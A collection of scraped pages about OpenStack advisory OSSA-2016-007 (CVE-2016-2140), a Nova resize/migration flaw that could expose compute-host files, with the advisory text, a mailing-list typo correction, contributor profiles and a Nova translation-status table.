=== Content from security.openstack.org_cb9cffb8_20250125_233246.html ===


Toggle navigation

 Search

* [Software](https://www.openstack.org/software/)
  + [Overview](https://www.openstack.org/software/)
  + [OpenStack Components](https://www.openstack.org/software/project-navigator/openstack-components)
  + [SDKs](https://www.openstack.org/software/project-navigator/sdks)
  + [Deployment Tools](https://www.openstack.org/software/project-navigator/deployment-tools)
  + [OpenStack Map](https://www.openstack.org/assets/software/projectmap/openstack-map.pdf)
  + [Sample Configs](https://www.openstack.org/software/sample-configs/)
* [Use Cases](https://www.openstack.org/use-cases/)
  + [Users in Production](https://www.openstack.org/use-cases/)
  + [Ironic Bare Metal](https://www.openstack.org/use-cases/bare-metal/)
  + [Edge Computing](https://www.openstack.org/use-cases/edge-computing/)
  + [Telecom & NFV](https://www.openstack.org/use-cases/telecoms-and-nfv/)
  + [Science and HPC](https://www.openstack.org/use-cases/science/)
  + [Containers](https://www.openstack.org/use-cases/containers/)
  + [Enterprise](https://www.openstack.org/use-cases/enterprise/)
  + [User Survey](https://www.openstack.org/surveys/landing)
* [Events](https://openinfra.dev/summit)
  + [OpenInfra Summit](https://openinfra.dev/summit)
  + [Project Teams Gathering](https://www.openstack.org/ptg/)
  + [OpenDev](https://www.openstack.org/events/opendev-2020/)
  + [Community Events](https://www.openstack.org/events/community-events/)
  + [OpenStack & OpenInfra Days](https://www.openstack.org/events/openstackdays)
  + [Summit Videos](https://www.openstack.org/videos/)
* [Community](https://www.openstack.org/community/)
  + [Welcome! Start Here](https://www.openstack.org/community/)
  + [OpenStack Technical Committee](https://www.openstack.org/community/tech-committee)
  + [Speakers Bureau](https://www.openstack.org/community/speakers/)
  + [OpenStack Wiki](http://wiki.openstack.org)
  + [Get Certified (COA)](https://www.openstack.org/coa/)
  + [Jobs](https://www.openstack.org/community/jobs/)
  + [Marketing Resources](https://www.openstack.org/marketing/)
  + [Community News](https://www.openstack.org/news/)
  + [Superuser Magazine](http://superuser.openstack.org)
  + [OpenInfra Foundation Supporting Organizations](https://www.openstack.org/community/supporting-organizations/)
  + [OpenInfra Foundation](https://openinfra.dev)
* [Marketplace](https://www.openstack.org/marketplace/)
  + [Training](https://www.openstack.org/marketplace/training/)
  + [Distros & Appliances](https://www.openstack.org/marketplace/distros/)
  + [Public Clouds](https://www.openstack.org/marketplace/public-clouds/)
  + [Hosted Private Clouds](https://www.openstack.org/marketplace/hosted-private-clouds/)
  + [Remotely Managed Private Clouds](https://www.openstack.org/marketplace/remotely-managed-private-clouds/)
  + [Consulting & Integrators](https://www.openstack.org/marketplace/consulting/)
  + [Drivers](https://www.openstack.org/marketplace/drivers/)
* [Blog](https://www.openstack.org/blog/)
* [Docs](http://docs.openstack.org/)
* [Join](https://openinfra.dev/join/)
  + [Sign up for Foundation Membership](https://openinfra.dev/join/)
  + [Sponsor the Foundation](https://openinfra.dev/join/)
  + [More about the Foundation](https://openinfra.dev)
* [Log In](https://www.openstack.org/Security/login/?BackURL=/home/)

# OSSA-2016-007: Nova host data leak through resize/migration

# OSSA-2016-007: Nova host data leak through resize/migration[Â¶](#ossa-2016-007-nova-host-data-leak-through-resize-migration "Link to this heading")

Date:

March 08, 2016

CVE:

CVE-2016-2140

## Affects[Â¶](#affects "Link to this heading")

* Nova: <=2015.1.3, >=12.0.0 <=12.0.2

## Description[Â¶](#description "Link to this heading")

Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting âuse\_cow\_images = Falseâ (not default) are affected.

## Errata[Â¶](#errata "Link to this heading")

The former fix did not take into account the usage of non-disk-image backends and caused a regression for this use-case. This update provides an additional fix for that issue. Moreover, the kilo backport caused a regression in live migration where the disk info file is JSON encoded. This second update provides an additional fix for stable/kilo.

## Patches[Â¶](#patches "Link to this heading")

* <https://review.openstack.org/289960> - original (Kilo)
* <https://review.openstack.org/290847> - errata (Kilo)
* <https://review.openstack.org/294205> - errata#2 (Kilo)
* <https://review.openstack.org/289958> - original (Liberty)
* <https://review.openstack.org/290843> - errata (Liberty)
* <https://review.openstack.org/289957> - original (Mitaka)
* <https://review.openstack.org/290715> - errata (Mitaka)

## Credits[Â¶](#credits "Link to this heading")

* Matthew Booth from Red Hat (CVE-2016-2140)

## References[Â¶](#references "Link to this heading")

* <https://bugs.launchpad.net/bugs/1548450>
* <https://bugs.launchpad.net/bugs/1555287>
* <https://bugs.launchpad.net/bugs/1558697>
* <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2140>

## Notes[Â¶](#notes "Link to this heading")

* This fix will be included in future 2015.1.4 (kilo) and 12.0.3
  (liberty) releases.

## OSSA History[Â¶](#ossa-history "Link to this heading")

* 2016-03-30 - Errata 2
* 2016-03-09 - Errata 1
* 2016-03-08 - Original Version

this page last updated: 2025-01-07 18:17:35

[![Creative Commons Attribution 3.0 License](../_static/images/docs/license.png)](https://creativecommons.org/licenses/by/3.0/)

Except where otherwise noted, this document is licensed under
[Creative Commons
Attribution 3.0 License](https://creativecommons.org/licenses/by/3.0/). See all [OpenStack Legal Documents](https://www.openstack.org/legal).

found an error? report a bug

OpenStack Documentation

* Guides
* [Install Guides](https://docs.openstack.org/index.html#install-guides)
* [User Guides](https://docs.openstack.org/index.html#user-guides)
* [Configuration Guides](https://docs.openstack.org/index.html#configuration-guides)
* [Operations and Administration Guides](https://docs.openstack.org/index.html#ops-and-admin-guides)
* [API Guides](https://docs.openstack.org/index.html#api-guides)
* [Contributor Guides](https://docs.openstack.org/index.html#contributor-guides)
* Languages
* [Deutsch (German)](https://docs.openstack.org/de/)
* [FranÃ§ais (French)](https://docs.openstack.org/fr/)
* [Bahasa Indonesia (Indonesian)](https://docs.openstack.org/id/)
* [Italiano (Italian)](https://docs.openstack.org/it/)
* [æ¥æ¬èª (Japanese)](https://docs.openstack.org/ja/)
* [íêµ­ì´ (Korean)](https://docs.openstack.org/ko_KR/)
* [PortuguÃªs (Portuguese)](https://docs.openstack.org/pt_BR/)
* [TÃ¼rkÃ§e (TÃ¼rkiye)](https://docs.openstack.org/tr_TR/)
* [ç®ä½ä¸­æ (Simplified Chinese)](https://docs.openstack.org/zh_CN/)

#### Contents

* OSSA-2016-007: Nova host data leak through resize/migration
  + [Affects](#affects)
  + [Description](#description)
  + [Errata](#errata)
  + [Patches](#patches)
  + [Credits](#credits)
  + [References](#references)
  + [Notes](#notes)
  + [OSSA History](#ossa-history)

### OpenStack

* [Projects](https://www.openstack.org/software/project-navigator/)
* [OpenStack Security](https://security.openstack.org/)
* [Blog](https://openstack.org/blog/)
* [News](https://openstack.org/news/)

### Community

* [User Groups](https://www.meetup.com/pro/openinfradev/)
* [Events](https://openstack.org/community/events/)
* [Jobs](https://openstack.org/community/jobs/)
* [Companies](https://openinfra.dev/members/)
* [Contribute](https://docs.openstack.org/contributors)

### Documentation

* [OpenStack Manuals](https://docs.openstack.org)
* [Getting Started](https://openstack.org/software/start/)
* [API Documentation](https://developer.openstack.org)
* [Wiki](https://wiki.openstack.org)

### Branding & Legal

* [Legal Docs](https://openinfra.dev/legal)
* [Logos & Guidelines](https://openstack.org/brand/)
* [Trademark Policy](https://openinfra.dev/legal/trademark-policy)
* [Privacy Policy](https://openinfra.dev/privacy-policy)
* [OpenInfra CLA](https://docs.openstack.org/contributors/common/setup-gerrit.html#individual-contributor-license-agreement)

### Stay In Touch

The OpenStack project is provided under the
[Apache 2.0 license](https://www.apache.org/licenses/LICENSE-2.0). Docs.openstack.org is powered by
[Rackspace Cloud Computing](https://rackspace.com).



=== Content from www.openwall.com_e9a0975e_20250125_233244.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](5) [[next>]](../../../2016/03/09/1) [[<thread-prev]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <56DF4BF7.8010904@redhat.com>
Date: Tue, 8 Mar 2016 22:02:31 +0000
From: Tristan Cacqueray <tdecacqu@...hat.com>
To: oss-security@...ts.openwall.com
Subject: Re: [OSSA 2016-007] Nova host data leak through
 resize/migration (CVE-2016-2140)

On 03/08/2016 08:16 PM, Tristan Cacqueray wrote:
> ===========================================================
> OSSA-2016-007: Nova host data leak through resize/migration
> ===========================================================
>
> :Date: March 08, 2016
> :CVE: CVE-2016-2140
>
>
> Affects
> ~~~~~~~
> - Nova: <=2015.1.3, >=12.0.0 <=12.0.2
>
>
> Description
> ~~~~~~~~~~~
> Matthew Booth from Red Hat reported a vulnerability in Nova instance
> resize/migration. By overwriting an ephemeral or root disk with a
> malicious image before requesting a resize, an authenticated user may
> be able to read arbitrary files from the compute host. Only setups
> using libvirt driver with raw storage and setting "use_cow_images =
> False" (not default) are affected.
>
>
> Patches
> ~~~~~~~
> - <https://review.openstack.org/289960> (Kilo)
> - <https://review.openstack.org/289958> (Liberty)
> - <https://review.openstack.org/289957> (Mitaka)
>
>
> Credits
> ~~~~~~~
> - Matthew Booth from Red Hat (CVE-2016-2140)
>
>
> References
> ~~~~~~~~~~
> - <https://bugs.launchpad.net/bugs/1548450>
> - <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2140>
>
>
> Notes
> ~~~~~
> - This fix will be included in future 2015.1.3 (kilo) and 12.0.3
>   (liberty) releases.

There is a typo in the note, this fix will be included in future
2015.1.4 (kilo). Further advisories will drop that note entirely, use
<http://releases.openstack.org/> to check stable version number including
the fix.

--
Tristan Cacqueray
OpenStack Vulnerability Management Team

Download attachment "[signature.asc](6/1)" of type "application/pgp-signature" (474 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from launchpad.net_68b49c0a_20250126_124915.html ===

[Log in / Register](https://launchpad.net/~mbooth-9/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~mbooth-9)

## [Matthew Booth](https://launchpad.net/~mbooth-9)

* Overview
* [Code](https://code.launchpad.net/~mbooth-9)
* [Bugs](https://bugs.launchpad.net/~mbooth-9)
* [Blueprints](https://blueprints.launchpad.net/~mbooth-9)
* [Translations](https://translations.launchpad.net/~mbooth-9)
* [Answers](https://answers.launchpad.net/~mbooth-9)

* [Related packages](https://launchpad.net/~mbooth-9/%2Brelated-packages)
* [Related projects](https://launchpad.net/~mbooth-9/%2Brelated-projects)

## User information

Launchpad Id:
mbooth-9

Email:
[Log in](%2Blogin) for email information.

Member since:
2014-01-23

Languages:

English

Time zone:

UTC
(UTC+0000)

Karma:
[20](https://launchpad.net/~mbooth-9/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

## [All bugs in progress](https://launchpad.net/~mbooth-9/%2Bassignedbugs?search=Search&field.status=In+Progress) Assigned bugs

||  | #1840912 [libvirt calls aren't reliably using tpool.Proxy](https://bugs.launchpad.net/nova/%2Bbug/1840912) |  |
| --- | --- | --- |
| in [OpenStack Compute (nova)](/nova) | | |

| --- | --- | --- | --- | --- | --- |
||  | #1719362 [libvirt: Data corruptor live migrating BFV instance with config disk](https://bugs.launchpad.net/nova/pike/%2Bbug/1719362) |  |
| --- | --- | --- |
| in [OpenStack Compute (nova)](/nova) | | |

## [All assigned blueprints](/~mbooth-9/%2Bspecs?role=assignee) Assigned blueprints

| **[Expose persistent serial numbers for local disks](https://blueprints.launchpad.net/nova/%2Bspec/local-disk-serial-numbers "local-disk-serial-numbers")** for **OpenStack Compute (nova)**  A guest querying the hardware properties of a disk will currently see a serial number for a volume, but not for a local disk (local root, ephemeral, or swap). This feature will add a persistent serial number for local disks. | |
| --- | --- |
| **[Libvirt driver imagebackend refactor](https://blueprints.launchpad.net/nova/%2Bspec/libvirt-imagebackend-refactor "libvirt-imagebackend-refactor")** for **OpenStack Compute (nova)**  This blueprint proposes cleaning up libvirt driver's imagebackend code and it's callers in the driver module. Specifically the intention is to eliminate imagebackend.Image.cache() and replace it with 2 separate methods, create\_from\_func() and create\_from\_image(), to be implemented separately by each backend. cache()... | |

## Latest memberships

Matthew Booth is not an
active member of any Launchpad teams.

## [Recent activities](https://launchpad.net/~mbooth-9/%2Bkarma) Most active in

| [neutron](/neutron) |  |
| --- | --- |
| [OpenStack Compute (nova)](/nova) |  |
| [oslo.utils](/oslo.utils) |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_9a97ec8f_20250126_124906.html ===




=== Content from launchpad.net_358978c3_20250126_124910.html ===

[Log in / Register](https://launchpad.net/~hudson-openstack/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~hudson-openstack)

## [OpenStack Infra](https://launchpad.net/~hudson-openstack)

* Overview
* [Code](https://code.launchpad.net/~hudson-openstack)
* [Bugs](https://bugs.launchpad.net/~hudson-openstack)
* [Blueprints](https://blueprints.launchpad.net/~hudson-openstack)
* [Translations](https://translations.launchpad.net/~hudson-openstack)
* [Answers](https://answers.launchpad.net/~hudson-openstack)

* [Related packages](https://launchpad.net/~hudson-openstack/%2Brelated-packages)
* [Related projects](https://launchpad.net/~hudson-openstack/%2Brelated-projects)

## User information

Launchpad Id:
hudson-openstack

Email:
[Log in](%2Blogin) for email information.

Member since:
2010-07-14

[![Icon of Burrow](https://launchpadlibrarian.net/67728214/os14.png "Member of Burrow")](/~burrow)
[![Icon of Citrix OpenStack development team](https://launchpadlibrarian.net/64472709/Citrix%2014.png "Member of Citrix OpenStack development team")](/~citrix-openstack)
[![Icon of (deprecated) OpenStack PPA maintainers](https://launchpadlibrarian.net/87891894/ppa.gif "Member of (deprecated) OpenStack PPA maintainers")](/~openstack-ppa)
[![Icon of Designate Core](https://launchpadlibrarian.net/360468328/designate_14.jpg "Member of Designate Core")](/~designate-core)
[![Icon of Designate Drivers](https://launchpadlibrarian.net/360468067/designate_14.jpg "Member of Designate Drivers")](/~designate-drivers)
[![Icon of MidoNet Bugs](https://launchpadlibrarian.net/228074955/midonet_14x14.png "Member of MidoNet Bugs")](/~midonet-bugs)
[![Icon of Nova Bug Team](https://launchpadlibrarian.net/108832444/bug.gif "Member of Nova Bug Team")](/~nova-bugs)
[![Icon of Nova](https://launchpadlibrarian.net/52560219/os14.png "Member of Nova")](/~nova)
[![Icon of OpenStack Team](https://launchpadlibrarian.net/52313052/os14.png "Member of OpenStack Team")](/~openstack)

Languages:

English

OpenPGP keys:

72571ACC301E6FE900837F5CDF85501232EE128C

SSH keys:

[hudson@hudson](%2Bsshkeys)

[jenkins@vpcslave](%2Bsshkeys)

Time zone:

UTC
(UTC+0000)

Karma:
[6503](https://launchpad.net/~hudson-openstack/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

## [All memberships](https://launchpad.net/~hudson-openstack/%2Bparticipation) Latest memberships

| [Compute Hyper-V Bugs](/~compute-hyperv-bugs)  Joined on 2019-08-28 | |
| --- | --- |
| [OS-Win Bugs](/~os-win-bugs)  Joined on 2019-08-28 | |
| [Networking Hyper-V Bugs](/~networking-hyperv-bugs)  Joined on 2019-08-28 | |
| [kolla-drivers](/~kolla-drivers)  Joined on 2019-05-20 | |
| [fixtures-git-bugs](/~fixtures-git-bugs)  Joined on 2018-03-25 | |

## [Recent activities](https://launchpad.net/~hudson-openstack/%2Bkarma) Most active in

| [StarlingX](/starlingx) |  |
| --- | --- |
| [kolla-ansible](/kolla-ansible) |  |
| [kolla](/kolla) |  |
| [kayobe](/kayobe) |  |
| [OpenStack Compute (nova)](/nova) |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from translations.launchpad.net_13b83fdf_20250126_124922.html ===

[Log in / Register](https://translations.launchpad.net/nova/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* Translations
* [Answers](https://answers.launchpad.net/nova)

# Translation overview

[Help for translations](https://help.launchpad.net/Translations)

### Translation details

Launchpad currently recommends translating
[OpenStack Compute (nova) trunk series](/nova/trunk).

To see all the translation files that are waiting to be
imported, please look at
[OpenStack Compute (nova) import queue](/nova/%2Bimports).

### Permissions

[OpenStack Compute (nova)](https://launchpad.net/nova) is translated
with [Open](/%2Bhelp-translations/permissions-policies.html)
permissions.

### All translatable series

* [OpenStack Compute (nova) trunk series](/nova/trunk/%2Btranslations)
* [OpenStack Compute (nova) bexar series](/nova/bexar/%2Btranslations)
* [OpenStack Compute (nova) cactus series](/nova/cactus/%2Btranslations)

### All translatable distribution packages

* [nova source package in Plucky](/ubuntu/plucky/%2Bsources/nova/%2Btranslations)
* [nova source package in Oracular](/ubuntu/oracular/%2Bsources/nova/%2Btranslations)
* [nova source package in Noble](/ubuntu/noble/%2Bsources/nova/%2Btranslations)
* [nova source package in Mantic](/ubuntu/mantic/%2Bsources/nova/%2Btranslations)
* [nova source package in Lunar](/ubuntu/lunar/%2Bsources/nova/%2Btranslations)
* [nova source package in Kinetic](/ubuntu/kinetic/%2Bsources/nova/%2Btranslations)
* [nova source package in Jammy](/ubuntu/jammy/%2Bsources/nova/%2Btranslations)
* [nova source package in Impish](/ubuntu/impish/%2Bsources/nova/%2Btranslations)
* [nova source package in Hirsute](/ubuntu/hirsute/%2Bsources/nova/%2Btranslations)
* [nova source package in Groovy](/ubuntu/groovy/%2Bsources/nova/%2Btranslations)
* [nova source package in Focal](/ubuntu/focal/%2Bsources/nova/%2Btranslations)
* [nova source package in Eoan](/ubuntu/eoan/%2Bsources/nova/%2Btranslations)
* [nova source package in Disco](/ubuntu/disco/%2Bsources/nova/%2Btranslations)
* [nova source package in Cosmic](/ubuntu/cosmic/%2Bsources/nova/%2Btranslations)
* [nova source package in Bionic](/ubuntu/bionic/%2Bsources/nova/%2Btranslations)
* [nova source package in Artful](/ubuntu/artful/%2Bsources/nova/%2Btranslations)
* [nova source package in Zesty](/ubuntu/zesty/%2Bsources/nova/%2Btranslations)
* [nova source package in Yakkety](/ubuntu/yakkety/%2Bsources/nova/%2Btranslations)
* [nova source package in Xenial](/ubuntu/xenial/%2Bsources/nova/%2Btranslations)
* [nova source package in Wily](/ubuntu/wily/%2Bsources/nova/%2Btranslations)
* [nova source package in Vivid](/ubuntu/vivid/%2Bsources/nova/%2Btranslations)
* [nova source package in Utopic](/ubuntu/utopic/%2Bsources/nova/%2Btranslations)
* [nova source package in Trusty](/ubuntu/trusty/%2Bsources/nova/%2Btranslations)
* [nova source package in Saucy](/ubuntu/saucy/%2Bsources/nova/%2Btranslations)
* [nova source package in Raring](/ubuntu/raring/%2Bsources/nova/%2Btranslations)
* [nova source package in Quantal](/ubuntu/quantal/%2Bsources/nova/%2Btranslations)
* [nova source package in Precise](/ubuntu/precise/%2Bsources/nova/%2Btranslations)

## Translation for trunk

| Language | Status | Untranslated | Needs review | Last Changed |
| --- | --- | --- | --- | --- |
| [Afrikaans](/nova/trunk/%2Bpots/nova/af/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/af/%2Btranslate?show=untranslated) | 254 [254](/nova/trunk/%2Bpots/nova/af/%2Btranslate?show=new_suggestions) | 2022-09-12 03:14:23 UTC 2022-09-12 |
| [Albanian](/nova/trunk/%2Bpots/nova/sq/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/sq/%2Btranslate?show=untranslated) | 0 0 | 2014-04-02 15:56:19 UTC 2014-04-02 |
| [Arabic](/nova/trunk/%2Bpots/nova/ar/%2Btranslate) | 13 099.14  0.8563899868247694% translated  99.14361001317523% untranslated | 1505 [1505](/nova/trunk/%2Bpots/nova/ar/%2Btranslate?show=untranslated) | 0 0 | 2013-02-16 21:33:39 UTC 2013-02-16 |
| [Asturian](/nova/trunk/%2Bpots/nova/ast/%2Btranslate) | 2 099.87  0.13175230566534915% translated  99.86824769433466% untranslated | 1516 [1516](/nova/trunk/%2Bpots/nova/ast/%2Btranslate?show=untranslated) | 0 0 | 2011-01-12 19:50:20 UTC 2011-01-12 |
| [Azerbaijani](/nova/trunk/%2Bpots/nova/az/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/az/%2Btranslate?show=untranslated) | 5 [5](/nova/trunk/%2Bpots/nova/az/%2Btranslate?show=new_suggestions) | 2013-04-03 14:46:02 UTC 2013-04-03 |
| [Basque](/nova/trunk/%2Bpots/nova/eu/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/eu/%2Btranslate?show=untranslated) | 0 0 | 2013-12-05 23:09:27 UTC 2013-12-05 |
| [Belarusian](/nova/trunk/%2Bpots/nova/be/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/be/%2Btranslate?show=untranslated) | 1 [1](/nova/trunk/%2Bpots/nova/be/%2Btranslate?show=new_suggestions) | 2020-05-03 16:45:18 UTC 2020-05-03 |
| [Bosnian](/nova/trunk/%2Bpots/nova/bs/%2Btranslate) | 2 099.87  0.13175230566534915% translated  99.86824769433466% untranslated | 1516 [1516](/nova/trunk/%2Bpots/nova/bs/%2Btranslate?show=untranslated) | 914 [914](/nova/trunk/%2Bpots/nova/bs/%2Btranslate?show=new_suggestions) | 2012-01-19 20:22:10 UTC 2012-01-19 |
| [Brazilian Portuguese](/nova/trunk/%2Bpots/nova/pt_BR/%2Btranslate) | 815 046.31  53.689064558629774% translated  46.31093544137022% untranslated | 703 [703](/nova/trunk/%2Bpots/nova/pt_BR/%2Btranslate?show=untranslated) | 84 [84](/nova/trunk/%2Bpots/nova/pt_BR/%2Btranslate?show=new_suggestions) | 2013-02-06 03:43:42 UTC 2013-02-06 |
| [Catalan](/nova/trunk/%2Bpots/nova/ca/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ca/%2Btranslate?show=untranslated) | 0 0 | 2013-06-07 09:16:32 UTC 2013-06-07 |
| [Chechen](/nova/trunk/%2Bpots/nova/ce/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/ce/%2Btranslate?show=untranslated) | 0 0 | 2014-08-13 08:13:14 UTC 2014-08-13 |
| [Chinese (Hong Kong)](/nova/trunk/%2Bpots/nova/zh_HK/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/zh_HK/%2Btranslate?show=untranslated) | 0 0 | 2013-06-07 09:16:31 UTC 2013-06-07 |
| [Chinese (Simplified)](/nova/trunk/%2Bpots/nova/zh_CN/%2Btranslate) | 1518 000.00  100.0% translated | 0 0 | 106 [106](/nova/trunk/%2Bpots/nova/zh_CN/%2Btranslate?show=new_suggestions) | 2013-06-05 09:20:38 UTC 2013-06-05 |
| [Chinese (Traditional)](/nova/trunk/%2Bpots/nova/zh_TW/%2Btranslate) | 294 080.63  19.367588932806324% translated  80.63241106719367% untranslated | 1224 [1224](/nova/trunk/%2Bpots/nova/zh_TW/%2Btranslate?show=untranslated) | 30 [30](/nova/trunk/%2Bpots/nova/zh_TW/%2Btranslate?show=new_suggestions) | 2012-08-15 07:46:05 UTC 2012-08-15 |
| [Croatian](/nova/trunk/%2Bpots/nova/hr/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/hr/%2Btranslate?show=untranslated) | 0 0 | 2013-06-07 09:16:33 UTC 2013-06-07 |
| [Czech](/nova/trunk/%2Bpots/nova/cs/%2Btranslate) | 1518 000.00  100.0% translated | 0 0 | 4 [4](/nova/trunk/%2Bpots/nova/cs/%2Btranslate?show=new_suggestions) | 2013-05-12 21:44:53 UTC 2013-05-12 |
| [Danish](/nova/trunk/%2Bpots/nova/da/%2Btranslate) | 2 099.87  0.13175230566534915% translated  99.86824769433466% untranslated | 1516 [1516](/nova/trunk/%2Bpots/nova/da/%2Btranslate?show=untranslated) | 2 [2](/nova/trunk/%2Bpots/nova/da/%2Btranslate?show=new_suggestions) | 2011-01-15 21:46:58 UTC 2011-01-15 |
| [English (Australia)](/nova/trunk/%2Bpots/nova/en_AU/%2Btranslate) | 350 076.94  23.056653491436098% translated  76.9433465085639% untranslated | 1168 [1168](/nova/trunk/%2Bpots/nova/en_AU/%2Btranslate?show=untranslated) | 1166 [1166](/nova/trunk/%2Bpots/nova/en_AU/%2Btranslate?show=new_suggestions) | 2012-06-17 06:35:56 UTC 2012-06-17 |
| [English (Canada)](/nova/trunk/%2Bpots/nova/en_CA/%2Btranslate) | 0 100.00  100.0% untranslated | 1518 [1518](/nova/trunk/%2Bpots/nova/en_CA/%2Btranslate?show=untranslated) | 0 0 | 2013-09-10 14:44:32 UTC 2013-09-10 |
| [English (United Kingdom)](/nova/trunk/%2Bpots/nova/en_GB/%2Btranslate) | 1518 000.00  100.0% translated | 0 0 | 10 [10](/nova/trunk/%2Bpots/nova/en_GB/%2Btranslate?show=new_suggestions) | 2013-06-04 15:36:12 UTC 2013-06-04 |
| [Filipino](/nova/trunk/%2Bpots/nova/fil/%2Btranslate) | 30 098.02  1.9762845849802373% translated  98.02371541501977% untranslated | 1488 [1488](/nova/trunk/%2Bpots/nova/fil/%2Btranslate?show=untranslated) | 0 0 | 2012-07-20 05:07:53 UTC 2012-07-20 |
| [French](/nova/trunk/%2Bpots/nova/fr/%2Btranslate) | 641 057.77  42.226613965744406% translated  57.7733860342556% untranslated | 877 [877](/nova/trunk/%2Bpots/nova/fr/%2Btranslate?show=untranslated) | 139 [139](/nova/trunk/%2Bpots/nova/fr/%2Btranslate?show=new_suggestions) | 2013-03-04 16:32:33 UTC 2013-03-04 |
| [Galician](/nova/trunk/%2Bpots/nova/gl/%2Btranslate) | 97 093.61  6.389986824769434% translated  93.61001317523056% untranslated | 1421 [1421](/nova/trunk/%2Bpots/nova/gl/%2Btranslate?show=untranslated) | 5 [5](/nova/trunk/%2Bpots/nova/gl/%2Btranslate?show=new_suggestions) | 2013-07-10 23:58:13 UTC 2013-07-10 |
| [German](/nova/trunk/%2Bpots/nova/de/%2Btranslate) | 1094 027.93  72.06851119894598% translated  27.931488801054016% untranslated | 424 [424](/nova/trunk/%2Bpots/nova/de/%2Btranslate?show=untranslated) | 31 [31](/nova/trunk/%2Bpots/nova/de/%2Btranslate?show=new_suggestions) | 2013-07-10 09:57:58 UTC 2013-07-10 |
